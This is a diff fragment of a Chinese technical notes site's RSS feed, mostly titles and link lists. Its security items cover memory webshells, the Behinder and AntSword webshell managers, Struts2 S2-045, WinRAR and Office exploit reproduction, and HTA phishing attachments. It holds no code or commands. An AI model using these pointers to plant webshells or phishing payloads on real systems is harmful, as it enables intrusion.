+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">权限维持</source>
+      <description>权限维持</description>
+      <pubDate>Wed, 18 Sep 2024 06:31:01 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">内存马</source>
+      <description>内存马
+
+一文看懂内存马 - FreeBuf网络安全行业门户
+Getshell/Mshell: Memshell-攻防内存马研究 (github.com)
+
+
+
+内存马
+
+内存马简介
+
+WebShell变迁
+如何实现Webshell内存马
+内存马分类
+
+
+相关链接
+
+
+
+
+内存马简介
+WebShell变迁
+
+一文看懂内存马 - FreeBuf网络安全行...</description>
+      <pubDate>Wed, 18 Sep 2024 03:00:30 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreferrer">一文看懂内存马 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://github.com/Getshell/Mshell?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">Getshell/Mshell: Memshell-攻防内存马研究 (github.com)</a></p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>冰蝎</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Webshell/Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/%E5%86%B0%E8%9D%8E.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Webshell/Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/%E5%86%B0%E8%9D%8E.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">冰蝎</source>
+      <description>冰蝎
+
+rebeyond/Behinder: “冰蝎”动态二进制加密网站管理客户端 (github.com)
+
+
+流量分析
+
+冰蝎4.0客户端流量分析 - 先知社区 (aliyun.com)
+冰蝎和蚁剑的流量特征 · 2022护网笔记 · 看云 (kancloud.cn)</description>
+      <pubDate>Wed, 18 Sep 2024 03:00:30 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener noreferrer">rebeyond/Behinder: “冰蝎”动态二进制加密网站管理客户端 (github.com)</a></p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>蚁剑</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Webshell/Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/%E8%9A%81%E5%89%91.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Webshell/Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/%E8%9A%81%E5%89%91.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">蚁剑</source>
+      <description>蚁剑
+
+AntSwordProject/antSword: 中国蚁剑是一款跨平台的开源网站管理工具。AntSword is a cross-platform website management toolkit. (github.com)
+1. 快速入门 (yuque.com)
+
+
+安装
+
+获取蚁剑 (yuque.com)
+
+
+
+下载 loader
+在...</description>
+      <pubDate>Wed, 18 Sep 2024 03:00:30 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://github.com/AntSwordProject/antSword?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">AntSwordProject/antSword: 中国蚁剑是一款跨平台的开源网站管理工具。AntSword is a cross-platform website management toolkit. (github.com)</a></p>
+<p><a href="https://www.yuque.com/antswordproject/antsword/lmwppk" target="_blank" rel="noopener noreferrer">1. 快速入门 (yuque.com)</a></p>
+</blockquote>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Java内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Java内存马</source>
+      <description>Java内存马
+
+一文看懂内存马 - FreeBuf网络安全行业门户
+
+
+
+Java内存马
+
+概述
+JavaWeb内存马分类
+Java Web 三大件
+
+Servlet
+
+请求的处理过程
+Servlet 生命周期
+
+
+Filter
+
+Filter的基本工作原理
+Filter的生命周期
+Filter链
+
+
+Listener
+
+
+Servlet容器
+
+To...</description>
+      <pubDate>Wed, 18 Sep 2024 03:00:30 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener noreferrer">一文看懂内存马 - FreeBuf网络安全行业门户</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409101616577.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Struts2内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Struts2%E5%86%85%E5%AD%98%E9%A9%AC/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Struts2%E5%86%85%E5%AD%98%E9%A9%AC/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Struts2内存马</source>
+      <description>Struts2内存马
+
+Struts2 的内存马 - xiaozhiru - 博客园 (cnblogs.com)
+
+Struts2 请求流程图:
+img
+
+命令执行写文件
+
+struts2绕过waf读写文件及另类方式执行命令 (qq.com)
+绕过Struts2 waf写入冰蝎马 - 墨天轮 (modb.pro)
+
+
+步履维艰Struts2内存马
+
+搜...</description>
+      <pubDate>Wed, 18 Sep 2024 03:00:30 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.cnblogs.com/xiaozhiru/p/16163057.html" target="_blank" rel="noopener noreferrer">Struts2 的内存马 - xiaozhiru - 博客园 (cnblogs.com)</a></p>
+</blockquote>
+<p>Struts2 请求流程图:</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202408281334484.png" alt="img"></p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202408281334484.png" type="image/png"/>
+    </item>
+    <item>
+      <title>s2-045内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Struts2%E5%86%85%E5%AD%98%E9%A9%AC/s2-045%E5%86%85%E5%AD%98%E9%A9%AC.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Struts2%E5%86%85%E5%AD%98%E9%A9%AC/s2-045%E5%86%85%E5%AD%98%E9%A9%AC.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">s2-045内存马</source>
+      <description>s2-045内存马
+
+S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com)
+s2-045真正一键getshell菜刀马-突破任何限制 | pirogue
+
+
+漏洞概述
+
+漏洞编号: CVE-2017-5638 Struts2远程代码执行漏洞
+漏洞类型: 远程代码执行漏洞
+危险等级: 高危
+利用条件: Struts2在受影...</description>
+      <pubDate>Wed, 18 Sep 2024 03:00:30 GMT</pubDate>
+      <content:encoded><![CDATA[
+<blockquote>
+<p><a href="https://www.cnblogs.com/tide-sec/p/16304736.html" target="_blank" rel="noopener noreferrer">S2-045 写入内存马 - ccadmin - 博客园 (cnblogs.com)</a></p>
+<p><a href="http://pirogue.org/2017/03/09/s2-045%E7%9C%9F%E6%AD%A3%E4%B8%80%E9%94%AEgetshell%E8%8F%9C%E5%88%80%E9%A9%AC-%E7%AA%81%E7%A0%B4%E4%BB%BB%E4%BD%95%E9%99%90%E5%88%B6/" target="_blank" rel="noopener noreferrer">s2-045真正一键getshell菜刀马-突破任何限制 | pirogue</a></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409201522232.png" type="image/png"/>
+    </item>
+    <item>
+      <title>SSH 隧道</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/SSH%E9%9A%A7%E9%81%93.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/SSH%E9%9A%A7%E9%81%93.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">SSH 隧道</source>
+      <description>SSH 隧道
+
+
+SSH 隧道
+
+本地端口转发(Local Port Forwarding)
+
+本地端口转发应用场景-访问受限服务
+
+
+远程端口转发(Remote Port Forwarding)
+
+远程端口转发应用场景-断网主机联网
+
+
+动态端口转发(Dynamic Port Forwarding)
+
+
+
+
+
+什么是SSH隧道_SSH隧道介绍-华为云...</description>
+      <pubDate>Tue, 06 Aug 2024 07:37:40 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202408051521099.png" type="image/png"/>
+    </item>
+    <item>
+      <title>版本管理工具</title>
+      <link>https://233official.github.io/dailynotes/Language/Python/%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Python/%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">版本管理工具</source>
+      <description>版本管理工具
+
+版本管理工具
+
+Python版本管理工具
+
+pyenv
+
+安装
+使用
+
+
+conda
+
+miniconda
+Anaconda
+
+安装
+配置
+创建与使用 python 环境
+
+使用 Anaconda Navigator
+使用命令行
+
+
+Anaconda 换源
+Anaconda Navigator 升级
+报错收集
+
+check_hostna...</description>
+      <pubDate>Wed, 31 Jul 2024 11:03:30 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7">版本管理工具</a>
+<ul>
+<li><a href="#python%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7">Python版本管理工具</a>
+<ul>
+<li><a href="#pyenv">pyenv</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8">使用</a></li>
+</ul>
+</li>
+<li><a href="#conda">conda</a>
+<ul>
+<li><a href="#miniconda">miniconda</a></li>
+<li><a href="#anaconda">Anaconda</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85-1">安装</a></li>
+<li><a href="#%E9%85%8D%E7%BD%AE">配置</a></li>
+<li><a href="#%E5%88%9B%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8-python-%E7%8E%AF%E5%A2%83">创建与使用 python 环境</a>
+<ul>
+<li><a href="#%E4%BD%BF%E7%94%A8-anaconda-navigator">使用 Anaconda Navigator</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C">使用命令行</a></li>
+</ul>
+</li>
+<li><a href="#anaconda-%E6%8D%A2%E6%BA%90">Anaconda 换源</a></li>
+<li><a href="#anaconda-navigator-%E5%8D%87%E7%BA%A7">Anaconda Navigator 升级</a></li>
+<li><a href="#%E6%8A%A5%E9%94%99%E6%94%B6%E9%9B%86">报错收集</a>
+<ul>
+<li><a href="#check_hostname-requires-server_hostname">check_hostname requires server_hostname</a></li>
+<li><a href="#%E5%90%84%E7%B1%BB-httperror-%E7%9B%B8%E5%85%B3">各类 <code>HTTPError</code> 相关</a></li>
+<li><a href="#modulenotfounderror-no-module-named-pip_vendor"><code>ModuleNotFoundError: No module named 'pip._vendor....'</code></a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#linux-update-alternatives">Linux-update-alternatives</a></li>
+</ul>
+</li>
+<li><a href="#python%E4%BE%9D%E8%B5%96%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7">Python依赖版本管理工具</a>
+<ul>
+<li><a href="#virtual-environment">virtual environment</a></li>
+<li><a href="#pipenv">Pipenv</a></li>
+<li><a href="#poetry">Poetry</a>
+<ul>
+<li><a href="#%E7%B3%BB%E7%BB%9F%E9%9C%80%E6%B1%82">系统需求</a></li>
+<li><a href="#%E5%AE%89%E8%A3%85-2">安装</a></li>
+<li><a href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">配置文件</a>
+<ul>
+<li><a href="#pyprojecttoml">pyproject.toml</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">基本用法</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96">安装依赖</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83">使用虚拟环境</a></li>
+<li><a href="#%E7%BB%93%E5%90%88-conda-%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8">结合 conda 环境使用</a>
+<ul>
+<li><a href="#%E5%9C%A8%E5%BD%93%E5%89%8D-conda-%E7%8E%AF%E5%A2%83%E7%9A%84-bin-%E7%9B%AE%E5%BD%95%E4%B8%AD%E6%89%BE%E4%B8%8D%E5%88%B0-activate-%E8%84%9A%E6%9C%AC%E5%AF%BC%E8%87%B4%E7%8E%AF%E5%A2%83%E6%BF%80%E6%B4%BB%E5%A4%B1%E8%B4%A5ubuntu">在当前 conda 环境的 <code>bin</code> 目录中找不到 activate 脚本导致环境激活失败(ubuntu)</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a>
+<ul>
+<li><a href="#failed-to-create-the-collection-prompt-dismissed">Failed to create the collection: Prompt dismissed..</a></li>
+<li><a href="#%E5%8D%A1-keyring">卡 keyring</a></li>
+<li><a href="#python-%E7%89%88%E6%9C%AC%E4%B8%8D%E5%AF%B9">python 版本不对</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#pdm">PDM</a>
+<ul>
+<li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li>
+<li><a href="#%E4%B8%BB%E8%A6%81%E7%89%B9%E6%80%A7">主要特性</a></li>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%94%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83">为什么不用虚拟环境</a></li>
+<li><a href="#%E5%AE%89%E8%A3%85-3">安装</a></li>
+<li><a href="#quickstart">QuickStart</a></li>
+<li><a href="#working-with-pep-582">working with PEP 582</a></li>
+<li><a href="#pdm-scripts">PDM Scripts</a></li>
+<li><a href="#pdm-packer">PDM-packer</a></li>
+</ul>
+</li>
+<li><a href="#pipx">pipx</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85-4">安装</a></li>
+<li><a href="#%E6%A6%82%E8%BF%B0-1">概述</a></li>
+<li><a href="#pipx-%E4%B8%8E-pip-%E7%9A%84%E5%8C%BA%E5%88%AB">pipx 与 pip 的区别</a></li>
+<li><a href="#pipx-%E4%BB%8E%E4%BB%80%E4%B9%88%E5%9C%B0%E6%96%B9%E5%AE%89%E8%A3%85-app">pipx 从什么地方安装 app</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202407311706846.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CH12.反射</title>
+      <link>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH12-%E5%8F%8D%E5%B0%84.html</link>
+      <guid>https://233official.github.io/dailynotes/Language/Go/Go%E8%AF%AD%E8%A8%80%E5%9C%A3%E7%BB%8F/CH12-%E5%8F%8D%E5%B0%84.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CH12.反射</source>
+      <description>CH12.反射
+
+
+CH12.反射
+
+CH12.1.为何需要反射
+CH12.2.reflect.Type 和 reflect.Value
+
+reflect.Type
+reflect.Value
+
+
+CH12.3. Display，一个递归的值打印器
+CH12.4. 示例: 编码为S表达式
+CH12.5. 通过reflect.Value修改值
+CH12....</description>
+      <pubDate>Tue, 23 Jul 2024 03:19:26 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202407300209215.png" type="image/png"/>
+    </item>
+    <item>
+      <title>CVE-2018-20250WinRAR目录穿越漏洞</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2018-20250WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2018-20250WinRAR%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2018-20250WinRAR目录穿越漏洞</source>
+      <description>CVE-2018-20250WinRAR目录穿越漏洞</description>
+      <pubDate>Tue, 23 Jul 2024 03:14:00 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2023-38831-Winrar代码执行漏洞</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2023-38831-Winrar%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2023-38831-Winrar%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2023-38831-Winrar代码执行漏洞</source>
+      <description>CVE-2023-38831-Winrar代码执行漏洞</description>
+      <pubDate>Tue, 23 Jul 2024 03:14:00 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>HTA</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/HTA/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/HTA/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">HTA</source>
+      <description>HTA
+参考材料
+
+HTA钓鱼 - Google Search
+关于文档钓鱼的学习 | 藏青&amp;apos;s BLOG (cangqingzhe.github.io)
+红蓝对抗之钓鱼篇：常见钓鱼思路总结 - FreeBuf网络安全行业门户
+关于邮件钓鱼的哪些事 | ascotbe
+Cobalt Strike之CHM、LNK、HTA钓鱼 - 卿先生 - 博客园 (c...</description>
+      <pubDate>Tue, 23 Jul 2024 02:44:31 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>参考材料</h2>
+<ul>
+<li><a href="https://www.google.com/search?q=HTA%E9%92%93%E9%B1%BC&amp;sca_esv=f30a9b7fa8506153&amp;sxsrf=ADLYWILXwI3smgYlp7yq-VcpIz9l4WlMwQ%3A1720434559767&amp;ei=f7-LZr61LoOGuvQP-4S18AE&amp;ved=0ahUKEwj-8KyWnpeHAxUDg44IHXtCDR4Q4dUDCA8&amp;uact=5&amp;oq=HTA%E9%92%93%E9%B1%BC&amp;gs_lp=Egxnd3Mtd2l6LXNlcnAiCUhUQemSk-mxvEjTAVAAWABwAHgAkAEAmAEAoAEAqgEAuAEDyAEA-AEBmAIAoAIAmAMAkgcAoAcA&amp;sclient=gws-wiz-serp" target="_blank" rel="noopener noreferrer">HTA钓鱼 - Google Search</a></li>
+<li><a href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8E%E6%96%87%E6%A1%A3%E9%92%93%E9%B1%BC%E7%9A%84%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener noreferrer">关于文档钓鱼的学习 | 藏青's BLOG (cangqingzhe.github.io)</a></li>
+<li><a href="https://www.freebuf.com/articles/web/325322.html" target="_blank" rel="noopener noreferrer">红蓝对抗之钓鱼篇：常见钓鱼思路总结 - FreeBuf网络安全行业门户</a></li>
+<li><a href="https://www.ascotbe.com/2020/07/26/Office_0x01/" target="_blank" rel="noopener noreferrer">关于邮件钓鱼的哪些事 | ascotbe</a></li>
+<li><a href="https://www.cnblogs.com/-qing-/p/10900454.html" target="_blank" rel="noopener noreferrer">Cobalt Strike之CHM、LNK、HTA钓鱼 - 卿先生 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://www.henry-blog.life/henry-blog/readme/cobaltstrike-diao-yu-gong-ji" target="_blank" rel="noopener noreferrer">CobaltStrike钓鱼攻击 | Henry's Blog (henry-blog.life)</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/2285252" target="_blank" rel="noopener noreferrer">社工钓鱼之HTA钓鱼-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
+<li><a href="https://www.secrss.com/articles/14853" target="_blank" rel="noopener noreferrer">冒充安恒信息对看雪论坛的一次定向钓鱼攻击 - 安全内参 | 决策者的网络安全知识库 (secrss.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2017-8759</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-8759.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2017-8759.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2017-8759</source>
+      <description>CVE-2017-8759
+
+office-exploits/CVE-2017-8759/readme.md at master · SecWiki/office-exploits · GitHub
+CVE-2017-8759复现 - Google Search
+微软.NET Framework cve-2017-8759 复现 - 渗透测试中心 - ...</description>
+      <pubDate>Tue, 23 Jul 2024 02:44:31 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://github.com/SecWiki/office-exploits/blob/master/CVE-2017-8759/readme.md" target="_blank" rel="noopener noreferrer">office-exploits/CVE-2017-8759/readme.md at master · SecWiki/office-exploits · GitHub</a></li>
+<li><a href="https://www.google.com/search?q=CVE-2017-8759%E5%A4%8D%E7%8E%B0&amp;sca_esv=b0587616288d9197&amp;sxsrf=ADLYWILFWCEXUpWsqpvfJMduCpCAqb4hYA%3A1719560887092&amp;source=hp&amp;ei=t2p-ZoK3A5Pn2roPs5KCmA8&amp;iflsig=AL9hbdgAAAAAZn54x9S2PAc0KTbbBuamxRIYc6GTquQL&amp;ved=0ahUKEwjC7t6-5_2GAxWTs1YBHTOJAPMQ4dUDCBY&amp;uact=5&amp;oq=CVE-2017-8759%E5%A4%8D%E7%8E%B0&amp;gs_lp=Egdnd3Mtd2l6IhNDVkUtMjAxNy04NzU55aSN546wSNdAUMQGWJw_cAV4AJABAJgB0AGgAYMXqgEGMC4yMS4xuAEDyAEA-AEBmAISoALqDagCCsICBxAjGCcY6gLCAgQQIxgnwgILEAAYgAQYkQIYigXCAgoQABiABBhDGIoFwgIIEAAYgAQYsQPCAhEQLhiABBixAxjRAxiDARjHAcICEBAuGIAEGNEDGEMYxwEYigXCAgUQABiABMICBBAAGB7CAgYQABgFGB7CAgYQABgIGB7CAggQABiABBjLAcICCBAAGIAEGKIEmAMLkgcENS4xM6AHzm0&amp;sclient=gws-wiz#ip=1" target="_blank" rel="noopener noreferrer">CVE-2017-8759复现 - Google Search</a></li>
+<li><a href="https://www.cnblogs.com/backlion/p/7550902.html" target="_blank" rel="noopener noreferrer">微软.NET Framework cve-2017-8759 复现 - 渗透测试中心 - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://exp10it.io/2019/08/office-cve-2017-8759-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener noreferrer">Office CVE-2017-8759 复现 - X1r0z Blog (exp10it.io)</a></li>
+<li><a href="https://blog.csdn.net/qq_36360189/article/details/87920367" target="_blank" rel="noopener noreferrer">.NET Framework漏洞(CVE-2017-8759)复现及后续渗透-CSDN博客</a></li>
+<li><a href="https://fuping.site/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/" target="_blank" rel="noopener noreferrer">.NET框架0Day漏洞CVE-2017-8759复现过程 · 浮萍's Blog (fuping.site)</a></li>
+<li><a href="https://xz.aliyun.com/t/57?time__1311=n4RxyDn7DQ0QtiKDsdoYKwpDfx7u%2BDjEwiD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F" target="_blank" rel="noopener noreferrer">.NET框架0Day漏洞复现过程—【CVE-2017-8759】 - 先知社区 (aliyun.com)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>CVE-2018-4993-AdobeAcrobat</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2018-4993-AdobeAcrobat.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/Office%E6%BC%8F%E6%B4%9E/CVE-2018-4993-AdobeAcrobat.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">CVE-2018-4993-AdobeAcrobat</source>
+      <description>CVE-2018-4993-AdobeAcrobat
+
+CVE-2018-4993漏洞正在用于攻击+资源-CSDN博客
+CVE-2018-4993 复现 - Google Search</description>
+      <pubDate>Tue, 23 Jul 2024 02:44:31 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="https://blog.csdn.net/blackorbird/article/details/102462336" target="_blank" rel="noopener noreferrer">CVE-2018-4993漏洞正在用于攻击+资源-CSDN博客</a></li>
